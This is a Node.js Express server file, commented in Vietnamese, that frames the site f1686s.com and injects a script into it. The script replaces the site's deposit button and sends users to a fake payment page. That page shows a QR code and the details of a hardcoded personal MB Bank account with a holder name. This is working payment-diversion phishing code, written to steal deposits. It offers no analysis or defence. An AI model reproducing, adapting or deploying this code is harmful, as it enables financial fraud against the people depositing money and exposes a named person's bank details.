const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.setHeader('Content-Type', 'text/html');
  res.send(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>f1686s.com</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body, html { width:100%; height:100%; overflow:hidden; background:#0a0a0a; }
    iframe { width:100%; height:100%; border:none; display:block; }
    #toast {
      position:fixed; bottom:40px; left:50%; transform:translateX(-50%);
      background:rgba(0,200,80,0.95); color:#fff; padding:12px 28px;
      border-radius:30px; font-size:15px; font-family:sans-serif;
      opacity:0; transition:opacity 0.5s; pointer-events:none;
      z-index:999999; white-space:nowrap; font-weight:600;
    }
    #toast.show { opacity:1; }
  </style>
</head>
<body>
<iframe id="mainFrame" src="https://f1686s.com/home/mine"></iframe>
<div id="toast">✅ Script đã kích hoạt</div>

<script>
(function() {
  'use strict';
  console.log('🚀 Cloud web khởi động');

  const BANK_ID = 'MB';
  const BANK_NAME = 'MBBANK NGÂN HÀNG QUÂN ĐỘI';
  const ACCOUNT_NO = '757526789';
  const ACCOUNT_NAME = 'NGUYEN VU DAT';

  // === TAMPERMONKEY CODE ===
  function getTampermonkeyCode() {
    return `
(function() {
  'use strict';
  console.log('🔧 TM: Bắt đầu trong iframe');

  const BANK_ID = '${BANK_ID}';
  const BANK_NAME = '${BANK_NAME}';
  const ACCOUNT_NO = '${ACCOUNT_NO}';
  const ACCOUNT_NAME = '${ACCOUNT_NAME}';
  const patched = new WeakSet();
  let redirecting = false;

  function randomTx() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 5; i++) code += chars[Math.floor(Math.random() * chars.length)];
    return code;
  }

  function buildPage(amount, txCode) {
    const amountVND = amount.toLocaleString('vi-VN') + ' VND';
    const qrUrl = 'https://img.vietqr.io/image/' + BANK_ID + '-' + ACCOUNT_NO + '-compact2.png?amount=' + amount + '&addInfo=' + txCode + '&accountName=' + encodeURIComponent(ACCOUNT_NAME);
    return '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Nạp Tiền</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:sans-serif;background:#fff8f0;padding:20px}.box{background:#fff;border-radius:16px;padding:24px;max-width:420px;margin:0 auto}.qr{text-align:center;margin:16px 0}.qr img{width:200px;border-radius:8px}.info{background:#f5f5f5;padding:12px 16px;margin:8px 0;border-radius:8px}.label{font-size:12px;color:#888}.value{font-size:16px;font-weight:700}.red{color:#e74c3c}.timer{color:#c0392b;font-size:28px;font-weight:800;text-align:center}</style></head><body><div class="box"><div class="timer" id="timer">15:00</div><div class="qr"><img id="qrImg" src="' + qrUrl + '"></div><div class="info"><div class="label">Số tiền</div><div class="value red">' + amountVND + '</div></div><div class="info"><div class="label">Ngân hàng</div><div class="value">' + BANK_NAME + '</div></div><div class="info"><div class="label">Số tài khoản</div><div class="value">' + ACCOUNT_NO + '</div></div><div class="info"><div class="label">Tên người nhận</div><div class="value">' + ACCOUNT_NAME + '</div></div><div class="info"><div class="label">Mã đơn hàng</div><div class="value">' + txCode + '</div></div></div><script>let s=900;setInterval(function(){s--;var m=String(Math.floor(s/60)).padStart(2,"0");var sec=String(s%60).padStart(2,"0");document.getElementById("timer").textContent=m+":"+sec;if(s<=0){document.getElementById("timer").textContent="⏰ HẾT GIỜ";}},1000);<\\/script></body></html>';
  }

  function doRedirect(e) {
    if (redirecting) return;
    redirecting = true;
    e.preventDefault();
    e.stopPropagation();
    var input = document.querySelector('.ui-input__input');
    var points = input ? parseInt(input.value) || 0 : 0;
    var amount = points * 1000;
    var txCode = randomTx();
    var html = buildPage(amount, txCode);
    var blob = new Blob([html], {type: 'text/html'});
    window.location.href = URL.createObjectURL(blob);
    setTimeout(function() { redirecting = false; }, 1500);
  }

  function patchButton(btn) {
    if (patched.has(btn)) return;
    patched.add(btn);
    btn.removeAttribute('disabled');
    btn.classList.remove('ui-button--disabled');
    var clone = btn.cloneNode(true);
    clone.removeAttribute('disabled');
    clone.classList.remove('ui-button--disabled');
    clone.onclick = null;
    if (btn.parentNode) {
      btn.parentNode.replaceChild(clone, btn);
    }
    patched.add(clone);
    clone.addEventListener('click', doRedirect);
    clone.addEventListener('touchend', doRedirect);
    console.log('✅ TM: Đã patch button');
  }

  function findAndPatch() {
    var btn = document.getElementById('depositSubmitClick');
    if (btn && !patched.has(btn)) {
      console.log('🔍 TM: Tìm thấy depositSubmitClick');
      patchButton(btn);
      return;
    }
    var buttons = document.querySelectorAll('button');
    for (var i = 0; i < buttons.length; i++) {
      var el = buttons[i];
      if (patched.has(el)) continue;
      var t = el.innerText || el.textContent || '';
      if (t.indexOf('Nạp Tiền Ngay') !== -1) {
        console.log('🔍 TM: Tìm thấy nút Nạp Tiền Ngay');
        patchButton(el);
      }
    }
  }

  var _push = history.pushState;
  history.pushState = function() {
    var args = Array.prototype.slice.call(arguments);
    _push.apply(history, args);
    setTimeout(findAndPatch, 200);
  };
  var _replace = history.replaceState;
  history.replaceState = function() {
    var args = Array.prototype.slice.call(arguments);
    _replace.apply(history, args);
    setTimeout(findAndPatch, 200);
  };
  window.addEventListener('popstate', function() {
    setTimeout(findAndPatch, 200);
  });

  findAndPatch();
  document.addEventListener('DOMContentLoaded', findAndPatch);
  window.addEventListener('load', function() {
    setTimeout(findAndPatch, 100);
    setTimeout(findAndPatch, 300);
    setTimeout(findAndPatch, 500);
  });

  setInterval(findAndPatch, 300);

  var observer = new MutationObserver(function() {
    findAndPatch();
  });
  observer.observe(document.documentElement || document.body, {
    childList: true,
    subtree: true
  });

  window.__tm_injected = true;
  console.log('✅ TM: Đã inject thành công!');
})();
`;
  }

  // === INJECT VÀO IFRAME ===
  function injectIntoFrame() {
    var frame = document.getElementById('mainFrame');
    if (!frame) {
      console.log('❌ Không tìm thấy iframe');
      return false;
    }
    try {
      var win = frame.contentWindow;
      var doc = frame.contentDocument;
      if (!win || !doc || !doc.body) {
        console.log('⏳ Chưa sẵn sàng để inject');
        return false;
      }
      if (win.__tm_injected) {
        console.log('✅ Đã inject rồi');
        return true;
      }
      console.log('🔄 Đang inject TM code...');
      var script = doc.createElement('script');
      script.textContent = getTampermonkeyCode();
      doc.body.appendChild(script);
      win.__tm_injected = true;

      var toast = document.getElementById('toast');
      toast.textContent = '✅ Script đã kích hoạt';
      toast.classList.add('show');
      setTimeout(function() { toast.classList.remove('show'); }, 3000);

      console.log('✅ Inject thành công!');
      return true;
    } catch (e) {
      console.log('❌ Lỗi inject:', e.message);
      return false;
    }
  }

  var frame = document.getElementById('mainFrame');

  frame.addEventListener('load', function onLoad() {
    console.log('📄 Iframe đã load');
    setTimeout(injectIntoFrame, 100);
    setTimeout(injectIntoFrame, 300);
    setTimeout(injectIntoFrame, 600);
    setTimeout(injectIntoFrame, 1000);
    setTimeout(injectIntoFrame, 2000);
    frame.removeEventListener('load', onLoad);
  });

  if (frame.contentDocument && frame.contentDocument.readyState === 'complete') {
    console.log('📄 Iframe đã load sẵn');
    setTimeout(injectIntoFrame, 50);
    setTimeout(injectIntoFrame, 200);
    setTimeout(injectIntoFrame, 500);
  }

  var count = 0;
  var interval = setInterval(function() {
    count++;
    if (injectIntoFrame()) {
      clearInterval(interval);
      setInterval(injectIntoFrame, 5000);
    }
    if (count > 30) {
      clearInterval(interval);
      console.log('⚠️ Dừng inject sau 30 lần thử');
    }
  }, 1000);

  document.addEventListener('gesturestart', function(e) { e.preventDefault(); });
  document.addEventListener('gesturechange', function(e) { e.preventDefault(); });
  document.addEventListener('gestureend', function(e) { e.preventDefault(); });

  document.addEventListener('touchmove', function(e) {
    if (e.target === document.body || e.target === document.documentElement) {
      e.preventDefault();
    }
  }, { passive: false });

  window.addEventListener('load', function() {
    setTimeout(function() {
      window.scrollTo(0, 1);
      window.scrollTo(0, 0);
    }, 100);
  });

  console.log('🚀 Cloud web đã sẵn sàng');
})();
</script>
</body>
</html>
  `);
});

app.listen(PORT, () => {
  console.log('✅ Server chạy tại port ' + PORT);
});
